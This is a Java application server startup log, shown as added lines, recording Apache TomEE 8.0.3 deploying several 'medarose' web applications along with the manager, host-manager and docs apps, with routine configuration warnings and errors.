+14-Jul-2024 16:59:12.653 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.RequestParameterProvider [org.ocpsoft.rewrite.prettyfaces.PrettyFacesRequestParameterProvider<0>]
+14-Jul-2024 16:59:12.655 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.el.spi.ExpressionLanguageProvider [org.ocpsoft.rewrite.faces.FacesExpressionLanguageProvider<30>]
+14-Jul-2024 16:59:12.657 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.spi.InvocationResultHandler [org.ocpsoft.rewrite.faces.NavigatingInvocationResultHandler<100>]
+14-Jul-2024 16:59:12.657 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [0] org.ocpsoft.common.spi.ServiceEnricher []
+14-Jul-2024 16:59:12.659 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.spi.ConfigurationCacheProvider [org.ocpsoft.rewrite.servlet.impl.ServletContextConfigurationCacheProvider<0>]
+14-Jul-2024 16:59:12.664 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [2] org.ocpsoft.rewrite.config.ConfigurationProvider [org.ocpsoft.rewrite.annotation.config.AnnotationConfigProvider<100>, org.ocpsoft.rewrite.prettyfaces.PrettyFacesRewriteConfigurationProvider<1>]
+14-Jul-2024 16:59:12.669 INFO [main] org.ocpsoft.rewrite.servlet.impl.DefaultHttpRewriteProvider.null Loaded [0] org.ocpsoft.rewrite.spi.RuleCacheProvider []
+14-Jul-2024 16:59:12.979 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Rewrite 3.4.2.Final initialized.
+14-Jul-2024 16:59:12.989 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Deployment of web application archive [/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war_old.war] has finished in [6,231] ms
+14-Jul-2024 16:59:12.990 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Deploying web application archive [/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war.war]
+14-Jul-2024 16:59:12.991 INFO [main] org.apache.tomee.catalina.TomcatWebAppBuilder.init ------------------------- localhost -> /medarose_war
+14-Jul-2024 16:59:13.067 SEVERE [main] org.apache.openejb.config.DeploymentLoader.addFacesConfigs A faces configuration file should be context relative when specified in web.xml. Please fix the value of context parameter javax.faces.CONFIG_FILES for the file WEB-INF/faces-config.xml
+14-Jul-2024 16:59:13.901 INFO [main] org.apache.openejb.config.ConfigurationFactory.configureApplication Configuring enterprise application: /opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war
+14-Jul-2024 16:59:15.079 INFO [main] org.apache.openejb.config.AppInfoBuilder.build Enterprise application "/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war" loaded.
+14-Jul-2024 16:59:15.079 INFO [main] org.apache.openejb.assembler.classic.Assembler.createApplication Assembling app: /opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war
+14-Jul-2024 16:59:15.087 INFO [main] org.apache.openejb.cdi.CdiBuilder.initSingleton Existing thread singleton service in SystemInstance(): org.apache.openejb.cdi.ThreadSingletonServiceImpl@2e11485
+14-Jul-2024 16:59:15.091 INFO [main] org.apache.openejb.cdi.ManagedSecurityService.<init> Some Principal APIs could not be loaded: org.eclipse.microprofile.jwt.JsonWebToken out of org.eclipse.microprofile.jwt.JsonWebToken not found
+14-Jul-2024 16:59:15.093 INFO [main] org.apache.openejb.cdi.OpenEJBLifecycle.startApplication OpenWebBeans Container is starting...
+14-Jul-2024 16:59:15.094 INFO [main] org.apache.webbeans.plugins.PluginLoader.startUp Adding OpenWebBeansPlugin : [CdiPlugin]
+14-Jul-2024 16:59:15.227 INFO [main] org.apache.openejb.cdi.CdiScanner.handleBda Using annotated mode for file:/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war/WEB-INF/lib/cdi-api-2.0.jar looking all classes to find CDI beans, maybe think to add a beans.xml if not there or add the jar to exclusions.list
+14-Jul-2024 16:59:15.299 INFO [main] org.springframework.data.mongodb.repository.cdi.MongoRepositoryExtension.<init> Activating CDI extension for Spring Data MongoDB repositories.
+14-Jul-2024 16:59:15.711 INFO [main] org.apache.webbeans.config.BeansDeployer.validateInjectionPoints All injection points were validated successfully.
+14-Jul-2024 16:59:15.717 INFO [main] org.apache.openejb.cdi.OpenEJBLifecycle.startApplication OpenWebBeans Container has started, it took 624 ms.
+14-Jul-2024 16:59:15.723 INFO [main] org.apache.openejb.assembler.classic.Assembler.createApplication Deployed Application(path=/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war)
+14-Jul-2024 16:59:16.519 INFO [main] org.apache.myfaces.ee.MyFacesContainerInitializer.onStartup Using org.apache.myfaces.ee.MyFacesContainerInitializer
+14-Jul-2024 16:59:16.520 INFO [main] org.omnifaces.ApplicationInitializer.logOmniFacesVersion Using OmniFaces version 3.2
+14-Jul-2024 16:59:16.658 INFO [main] org.apache.jasper.servlet.TldScanner.scanJars At least one JAR was scanned for TLDs yet contained no TLDs. Enable debug logging for this logger for a complete list of JARs that were scanned but no TLDs were found in them. Skipping unneeded JARs during scanning can improve startup time and JSP compilation time.
+14-Jul-2024 16:59:16.707 SEVERE [main] com.ocpsoft.pretty.faces.config.spi.ContextSpecifiedConfigurationProvider.loadConfiguration Pretty Faces config resource [/META-INF/pretty-config.xml] not found.
+14-Jul-2024 16:59:17.039 INFO [main] com.sun.faces.config.ConfigureListener.contextInitialized Initializing Mojarra 2.3.4 ( 20180405-0442 7a05fbdf38c7d725ccac9237e44de6dbc77bee7d) for context '/medarose_war'
+14-Jul-2024 16:59:17.337 INFO [main] org.ocpsoft.rewrite.faces.RewritePhaseListener.null RewritePhaseListener starting up.
+14-Jul-2024 16:59:18.060 INFO [main] org.primefaces.webapp.PostConstructApplicationEventListener.processEvent Running on PrimeFaces 8.0
+14-Jul-2024 16:59:18.062 INFO [main] org.primefaces.extensions.application.PostConstructApplicationEventListener.processEvent Running on PrimeFaces Extensions 8.0.2
+14-Jul-2024 16:59:18.068 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null RewriteFilter starting up...
+14-Jul-2024 16:59:18.088 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [4] org.ocpsoft.rewrite.servlet.spi.RewriteLifecycleListener [org.ocpsoft.rewrite.prettyfaces.PrettyFacesRewriteLifecycleListener<-100>, org.ocpsoft.rewrite.faces.FacesRewriteLifecycleListener<0>, org.ocpsoft.rewrite.servlet.impl.DefaultRewriteLifecycleListener<2147483647>, org.ocpsoft.rewrite.servlet.config.lifecycle.JoinRewriteLifecycleListener<2147483647>]
+14-Jul-2024 16:59:18.088 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.RequestCycleWrapper [org.ocpsoft.rewrite.servlet.impl.HttpRewriteRequestCycleWrapper<0>]
+14-Jul-2024 16:59:18.088 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.spi.RewriteProvider [org.ocpsoft.rewrite.servlet.impl.DefaultHttpRewriteProvider<0>]
+14-Jul-2024 16:59:18.088 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.RewriteResultHandler [org.ocpsoft.rewrite.servlet.impl.HttpRewriteResultHandler<0>]
+14-Jul-2024 16:59:18.088 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.InboundRewriteProducer [org.ocpsoft.rewrite.servlet.impl.HttpInboundRewriteProducer<0>]
+14-Jul-2024 16:59:18.088 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.OutboundRewriteProducer [org.ocpsoft.rewrite.servlet.impl.HttpOutboundRewriteProducer<0>]
+14-Jul-2024 16:59:18.089 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.ContextListener [org.ocpsoft.rewrite.prettyfaces.PrettyConfigContextListener<0>]
+14-Jul-2024 16:59:18.089 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [0] org.ocpsoft.rewrite.servlet.spi.RequestListener []
+14-Jul-2024 16:59:18.090 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.RequestParameterProvider [org.ocpsoft.rewrite.prettyfaces.PrettyFacesRequestParameterProvider<0>]
+14-Jul-2024 16:59:18.092 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.el.spi.ExpressionLanguageProvider [org.ocpsoft.rewrite.faces.FacesExpressionLanguageProvider<30>]
+14-Jul-2024 16:59:18.094 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.spi.InvocationResultHandler [org.ocpsoft.rewrite.faces.NavigatingInvocationResultHandler<100>]
+14-Jul-2024 16:59:18.094 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [0] org.ocpsoft.common.spi.ServiceEnricher []
+14-Jul-2024 16:59:18.096 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.spi.ConfigurationCacheProvider [org.ocpsoft.rewrite.servlet.impl.ServletContextConfigurationCacheProvider<0>]
+14-Jul-2024 16:59:18.099 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [2] org.ocpsoft.rewrite.config.ConfigurationProvider [org.ocpsoft.rewrite.annotation.config.AnnotationConfigProvider<100>, org.ocpsoft.rewrite.prettyfaces.PrettyFacesRewriteConfigurationProvider<1>]
+14-Jul-2024 16:59:18.102 INFO [main] org.ocpsoft.rewrite.servlet.impl.DefaultHttpRewriteProvider.null Loaded [0] org.ocpsoft.rewrite.spi.RuleCacheProvider []
+14-Jul-2024 16:59:18.363 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Rewrite 3.4.2.Final initialized.
+14-Jul-2024 16:59:18.372 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Deployment of web application archive [/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war.war] has finished in [5,382] ms
+14-Jul-2024 16:59:18.373 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Deploying web application directory [/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/host-manager]
+14-Jul-2024 16:59:18.375 INFO [main] org.apache.tomee.catalina.TomcatWebAppBuilder.init ------------------------- localhost -> /host-manager
+14-Jul-2024 16:59:18.398 INFO [main] org.apache.openejb.config.ConfigurationFactory.configureApplication Configuring enterprise application: /opt/tomee/apache-tomee-webprofile-8.0.3/webapps/host-manager
+14-Jul-2024 16:59:18.402 INFO [main] org.apache.openejb.config.AppInfoBuilder.build Enterprise application "/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/host-manager" loaded.
+14-Jul-2024 16:59:18.402 INFO [main] org.apache.openejb.assembler.classic.Assembler.createApplication Assembling app: /opt/tomee/apache-tomee-webprofile-8.0.3/webapps/host-manager
+14-Jul-2024 16:59:18.409 INFO [main] org.apache.tomee.catalina.TomcatWebAppBuilder.deployWebApps using context file /opt/tomee/apache-tomee-webprofile-8.0.3/webapps/host-manager/META-INF/context.xml
+14-Jul-2024 16:59:18.410 INFO [main] org.apache.openejb.assembler.classic.Assembler.createApplication Deployed Application(path=/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/host-manager)
+14-Jul-2024 16:59:18.432 INFO [main] org.apache.myfaces.ee.MyFacesContainerInitializer.onStartup Using org.apache.myfaces.ee.MyFacesContainerInitializer
+14-Jul-2024 16:59:18.470 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Deployment of web application directory [/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/host-manager] has finished in [97] ms
+14-Jul-2024 16:59:18.471 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Deploying web application directory [/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/manager]
+14-Jul-2024 16:59:18.472 INFO [main] org.apache.tomee.catalina.TomcatWebAppBuilder.init ------------------------- localhost -> /manager
+14-Jul-2024 16:59:18.491 INFO [main] org.apache.openejb.config.ConfigurationFactory.configureApplication Configuring enterprise application: /opt/tomee/apache-tomee-webprofile-8.0.3/webapps/manager
+14-Jul-2024 16:59:18.494 INFO [main] org.apache.openejb.config.AppInfoBuilder.build Enterprise application "/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/manager" loaded.
+14-Jul-2024 16:59:18.495 INFO [main] org.apache.openejb.assembler.classic.Assembler.createApplication Assembling app: /opt/tomee/apache-tomee-webprofile-8.0.3/webapps/manager
+14-Jul-2024 16:59:18.502 INFO [main] org.apache.tomee.catalina.TomcatWebAppBuilder.deployWebApps using context file /opt/tomee/apache-tomee-webprofile-8.0.3/webapps/manager/META-INF/context.xml
+14-Jul-2024 16:59:18.502 INFO [main] org.apache.openejb.assembler.classic.Assembler.createApplication Deployed Application(path=/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/manager)
+14-Jul-2024 16:59:18.523 INFO [main] org.apache.myfaces.ee.MyFacesContainerInitializer.onStartup Using org.apache.myfaces.ee.MyFacesContainerInitializer
+14-Jul-2024 16:59:18.544 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Deployment of web application directory [/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/manager] has finished in [73] ms
+14-Jul-2024 16:59:18.545 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Deploying web application directory [/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/docs]
+14-Jul-2024 16:59:18.545 INFO [main] org.apache.tomee.catalina.TomcatWebAppBuilder.init ------------------------- localhost -> /docs
+14-Jul-2024 16:59:18.561 INFO [main] org.apache.openejb.config.ConfigurationFactory.configureApplication Configuring enterprise application: /opt/tomee/apache-tomee-webprofile-8.0.3/webapps/docs
+14-Jul-2024 16:59:18.564 INFO [main] org.apache.openejb.config.AppInfoBuilder.build Enterprise application "/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/docs" loaded.
+14-Jul-2024 16:59:18.564 INFO [main] org.apache.openejb.assembler.classic.Assembler.createApplication Assembling app: /opt/tomee/apache-tomee-webprofile-8.0.3/webapps/docs
+14-Jul-2024 16:59:18.593 INFO [main] org.apache.openejb.assembler.classic.Assembler.createApplication Deployed Application(path=/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/docs)
+14-Jul-2024 16:59:18.610 INFO [main] org.apache.myfaces.ee.MyFacesContainerInitializer.onStartup Using org.apache.myfaces.ee.MyFacesContainerInitializer
+14-Jul-2024 16:59:18.630 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Deployment of web application directory [/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/docs] has finished in [85] ms
+14-Jul-2024 16:59:18.631 INFO [main] org.apache.tomee.catalina.TomcatWebAppBuilder.init ------------------------- dash.medarose.com -> /
+14-Jul-2024 16:59:18.717 SEVERE [main] org.apache.openejb.config.DeploymentLoader.addFacesConfigs A faces configuration file should be context relative when specified in web.xml. Please fix the value of context parameter javax.faces.CONFIG_FILES for the file WEB-INF/faces-config.xml
+14-Jul-2024 16:59:19.539 INFO [main] org.apache.openejb.config.ConfigurationFactory.configureApplication Configuring enterprise application: /opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war
+14-Jul-2024 16:59:20.627 INFO [main] org.apache.openejb.config.AppInfoBuilder.build Enterprise application "/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war" loaded.
+14-Jul-2024 16:59:20.628 INFO [main] org.apache.openejb.assembler.classic.Assembler.createApplication Assembling app: /opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war
+14-Jul-2024 16:59:20.635 INFO [main] org.apache.openejb.cdi.CdiBuilder.initSingleton Existing thread singleton service in SystemInstance(): org.apache.openejb.cdi.ThreadSingletonServiceImpl@2e11485
+14-Jul-2024 16:59:20.637 INFO [main] org.apache.openejb.cdi.ManagedSecurityService.<init> Some Principal APIs could not be loaded: org.eclipse.microprofile.jwt.JsonWebToken out of org.eclipse.microprofile.jwt.JsonWebToken not found
+14-Jul-2024 16:59:20.640 INFO [main] org.apache.openejb.cdi.OpenEJBLifecycle.startApplication OpenWebBeans Container is starting...
+14-Jul-2024 16:59:20.641 INFO [main] org.apache.webbeans.plugins.PluginLoader.startUp Adding OpenWebBeansPlugin : [CdiPlugin]
+14-Jul-2024 16:59:20.763 INFO [main] org.apache.openejb.cdi.CdiScanner.handleBda Using annotated mode for file:/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war/WEB-INF/lib/cdi-api-2.0.jar looking all classes to find CDI beans, maybe think to add a beans.xml if not there or add the jar to exclusions.list
+14-Jul-2024 16:59:20.833 INFO [main] org.springframework.data.mongodb.repository.cdi.MongoRepositoryExtension.<init> Activating CDI extension for Spring Data MongoDB repositories.
+14-Jul-2024 16:59:21.168 INFO [main] org.apache.webbeans.config.BeansDeployer.validateInjectionPoints All injection points were validated successfully.
+14-Jul-2024 16:59:21.172 INFO [main] org.apache.openejb.cdi.OpenEJBLifecycle.startApplication OpenWebBeans Container has started, it took 532 ms.
+14-Jul-2024 16:59:21.179 INFO [main] org.apache.openejb.assembler.classic.Assembler.createApplication Deployed Application(path=/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war)
+14-Jul-2024 16:59:21.702 INFO [main] org.apache.myfaces.ee.MyFacesContainerInitializer.onStartup Using org.apache.myfaces.ee.MyFacesContainerInitializer
+14-Jul-2024 16:59:21.703 INFO [main] org.omnifaces.ApplicationInitializer.logOmniFacesVersion Using OmniFaces version 3.2
+14-Jul-2024 16:59:21.850 INFO [main] org.apache.jasper.servlet.TldScanner.scanJars At least one JAR was scanned for TLDs yet contained no TLDs. Enable debug logging for this logger for a complete list of JARs that were scanned but no TLDs were found in them. Skipping unneeded JARs during scanning can improve startup time and JSP compilation time.
+14-Jul-2024 16:59:21.903 SEVERE [main] com.ocpsoft.pretty.faces.config.spi.ContextSpecifiedConfigurationProvider.loadConfiguration Pretty Faces config resource [/META-INF/pretty-config.xml] not found.
+14-Jul-2024 16:59:22.229 INFO [main] com.sun.faces.config.ConfigureListener.contextInitialized Initializing Mojarra 2.3.4 ( 20180405-0442 7a05fbdf38c7d725ccac9237e44de6dbc77bee7d) for context ''
+14-Jul-2024 16:59:22.538 INFO [main] org.ocpsoft.rewrite.faces.RewritePhaseListener.null RewritePhaseListener starting up.
+14-Jul-2024 16:59:23.200 INFO [main] org.primefaces.webapp.PostConstructApplicationEventListener.processEvent Running on PrimeFaces 8.0
+14-Jul-2024 16:59:23.202 INFO [main] org.primefaces.extensions.application.PostConstructApplicationEventListener.processEvent Running on PrimeFaces Extensions 8.0.2
+14-Jul-2024 16:59:23.208 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null RewriteFilter starting up...
+14-Jul-2024 16:59:23.230 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [4] org.ocpsoft.rewrite.servlet.spi.RewriteLifecycleListener [org.ocpsoft.rewrite.prettyfaces.PrettyFacesRewriteLifecycleListener<-100>, org.ocpsoft.rewrite.faces.FacesRewriteLifecycleListener<0>, org.ocpsoft.rewrite.servlet.config.lifecycle.JoinRewriteLifecycleListener<2147483647>, org.ocpsoft.rewrite.servlet.impl.DefaultRewriteLifecycleListener<2147483647>]
+14-Jul-2024 16:59:23.230 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.RequestCycleWrapper [org.ocpsoft.rewrite.servlet.impl.HttpRewriteRequestCycleWrapper<0>]
+14-Jul-2024 16:59:23.230 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.spi.RewriteProvider [org.ocpsoft.rewrite.servlet.impl.DefaultHttpRewriteProvider<0>]
+14-Jul-2024 16:59:23.230 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.RewriteResultHandler [org.ocpsoft.rewrite.servlet.impl.HttpRewriteResultHandler<0>]
+14-Jul-2024 16:59:23.230 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.InboundRewriteProducer [org.ocpsoft.rewrite.servlet.impl.HttpInboundRewriteProducer<0>]
+14-Jul-2024 16:59:23.230 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.OutboundRewriteProducer [org.ocpsoft.rewrite.servlet.impl.HttpOutboundRewriteProducer<0>]
+14-Jul-2024 16:59:23.231 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.ContextListener [org.ocpsoft.rewrite.prettyfaces.PrettyConfigContextListener<0>]
+14-Jul-2024 16:59:23.231 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [0] org.ocpsoft.rewrite.servlet.spi.RequestListener []
+14-Jul-2024 16:59:23.231 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.RequestParameterProvider [org.ocpsoft.rewrite.prettyfaces.PrettyFacesRequestParameterProvider<0>]
+14-Jul-2024 16:59:23.233 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.el.spi.ExpressionLanguageProvider [org.ocpsoft.rewrite.faces.FacesExpressionLanguageProvider<30>]
+14-Jul-2024 16:59:23.235 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.spi.InvocationResultHandler [org.ocpsoft.rewrite.faces.NavigatingInvocationResultHandler<100>]
+14-Jul-2024 16:59:23.235 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [0] org.ocpsoft.common.spi.ServiceEnricher []
+14-Jul-2024 16:59:23.237 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.spi.ConfigurationCacheProvider [org.ocpsoft.rewrite.servlet.impl.ServletContextConfigurationCacheProvider<0>]
+14-Jul-2024 16:59:23.240 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [2] org.ocpsoft.rewrite.config.ConfigurationProvider [org.ocpsoft.rewrite.annotation.config.AnnotationConfigProvider<100>, org.ocpsoft.rewrite.prettyfaces.PrettyFacesRewriteConfigurationProvider<1>]
+14-Jul-2024 16:59:23.244 INFO [main] org.ocpsoft.rewrite.servlet.impl.DefaultHttpRewriteProvider.null Loaded [0] org.ocpsoft.rewrite.spi.RuleCacheProvider []
+14-Jul-2024 16:59:23.531 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Rewrite 3.4.2.Final initialized.
+14-Jul-2024 16:59:23.541 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Deploying web application archive [/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war_old.war]
+14-Jul-2024 16:59:23.541 INFO [main] org.apache.tomee.catalina.TomcatWebAppBuilder.init ------------------------- dash.medarose.com -> /medarose_war_old
+14-Jul-2024 16:59:23.579 WARNING [main] org.apache.openejb.config.DeploymentLoader.getWebDescriptors Can't have a beans.xml in WEB-INF and WEB-INF/classes/META-INF, second will be ignored
+14-Jul-2024 16:59:23.579 WARNING [main] org.apache.openejb.config.DeploymentLoader.getWebDescriptors Can't have a beans.xml in WEB-INF and WEB-INF/classes/META-INF, second will be ignored
+14-Jul-2024 16:59:23.611 SEVERE [main] org.apache.openejb.config.DeploymentLoader.addFacesConfigs A faces configuration file should be context relative when specified in web.xml. Please fix the value of context parameter javax.faces.CONFIG_FILES for the file WEB-INF/faces-config.xml
+14-Jul-2024 16:59:24.470 INFO [main] org.apache.openejb.config.ConfigurationFactory.configureApplication Configuring enterprise application: /opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war_old
+14-Jul-2024 16:59:25.603 INFO [main] org.apache.openejb.config.AppInfoBuilder.build Enterprise application "/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war_old" loaded.
+14-Jul-2024 16:59:25.604 INFO [main] org.apache.openejb.assembler.classic.Assembler.createApplication Assembling app: /opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war_old
+14-Jul-2024 16:59:25.613 INFO [main] org.apache.openejb.cdi.CdiBuilder.initSingleton Existing thread singleton service in SystemInstance(): org.apache.openejb.cdi.ThreadSingletonServiceImpl@2e11485
+14-Jul-2024 16:59:25.616 INFO [main] org.apache.openejb.cdi.ManagedSecurityService.<init> Some Principal APIs could not be loaded: org.eclipse.microprofile.jwt.JsonWebToken out of org.eclipse.microprofile.jwt.JsonWebToken not found
+14-Jul-2024 16:59:25.619 INFO [main] org.apache.openejb.cdi.OpenEJBLifecycle.startApplication OpenWebBeans Container is starting...
+14-Jul-2024 16:59:25.619 INFO [main] org.apache.webbeans.plugins.PluginLoader.startUp Adding OpenWebBeansPlugin : [CdiPlugin]
+14-Jul-2024 16:59:25.761 INFO [main] org.apache.openejb.cdi.CdiScanner.handleBda Using annotated mode for file:/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war_old/WEB-INF/lib/cdi-api-2.0.jar looking all classes to find CDI beans, maybe think to add a beans.xml if not there or add the jar to exclusions.list
+14-Jul-2024 16:59:25.840 INFO [main] org.springframework.data.mongodb.repository.cdi.MongoRepositoryExtension.<init> Activating CDI extension for Spring Data MongoDB repositories.
+14-Jul-2024 16:59:26.188 INFO [main] org.apache.webbeans.config.BeansDeployer.validateInjectionPoints All injection points were validated successfully.
+14-Jul-2024 16:59:26.193 INFO [main] org.apache.openejb.cdi.OpenEJBLifecycle.startApplication OpenWebBeans Container has started, it took 574 ms.
+14-Jul-2024 16:59:26.199 INFO [main] org.apache.openejb.assembler.classic.Assembler.createApplication Deployed Application(path=/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war_old)
+14-Jul-2024 16:59:26.744 INFO [main] org.apache.myfaces.ee.MyFacesContainerInitializer.onStartup Using org.apache.myfaces.ee.MyFacesContainerInitializer
+14-Jul-2024 16:59:26.746 INFO [main] org.omnifaces.ApplicationInitializer.logOmniFacesVersion Using OmniFaces version 3.2
+14-Jul-2024 16:59:26.877 INFO [main] org.apache.jasper.servlet.TldScanner.scanJars At least one JAR was scanned for TLDs yet contained no TLDs. Enable debug logging for this logger for a complete list of JARs that were scanned but no TLDs were found in them. Skipping unneeded JARs during scanning can improve startup time and JSP compilation time.
+14-Jul-2024 16:59:27.222 SEVERE [main] com.ocpsoft.pretty.faces.config.spi.ContextSpecifiedConfigurationProvider.loadConfiguration Pretty Faces config resource [/META-INF/pretty-config.xml] not found.
+14-Jul-2024 16:59:27.295 INFO [main] com.sun.faces.config.ConfigureListener.contextInitialized Initializing Mojarra 2.3.4 ( 20180405-0442 7a05fbdf38c7d725ccac9237e44de6dbc77bee7d) for context '/medarose_war_old'
+14-Jul-2024 16:59:27.634 INFO [main] org.ocpsoft.rewrite.faces.RewritePhaseListener.null RewritePhaseListener starting up.
+14-Jul-2024 16:59:28.327 INFO [main] org.primefaces.webapp.PostConstructApplicationEventListener.processEvent Running on PrimeFaces 8.0
+14-Jul-2024 16:59:28.329 INFO [main] org.primefaces.extensions.application.PostConstructApplicationEventListener.processEvent Running on PrimeFaces Extensions 8.0
+14-Jul-2024 16:59:28.334 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null RewriteFilter starting up...
+14-Jul-2024 16:59:28.355 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [4] org.ocpsoft.rewrite.servlet.spi.RewriteLifecycleListener [org.ocpsoft.rewrite.prettyfaces.PrettyFacesRewriteLifecycleListener<-100>, org.ocpsoft.rewrite.faces.FacesRewriteLifecycleListener<0>, org.ocpsoft.rewrite.servlet.impl.DefaultRewriteLifecycleListener<2147483647>, org.ocpsoft.rewrite.servlet.config.lifecycle.JoinRewriteLifecycleListener<2147483647>]
+14-Jul-2024 16:59:28.355 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.RequestCycleWrapper [org.ocpsoft.rewrite.servlet.impl.HttpRewriteRequestCycleWrapper<0>]
+14-Jul-2024 16:59:28.355 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.spi.RewriteProvider [org.ocpsoft.rewrite.servlet.impl.DefaultHttpRewriteProvider<0>]
+14-Jul-2024 16:59:28.355 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.RewriteResultHandler [org.ocpsoft.rewrite.servlet.impl.HttpRewriteResultHandler<0>]
+14-Jul-2024 16:59:28.355 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.InboundRewriteProducer [org.ocpsoft.rewrite.servlet.impl.HttpInboundRewriteProducer<0>]
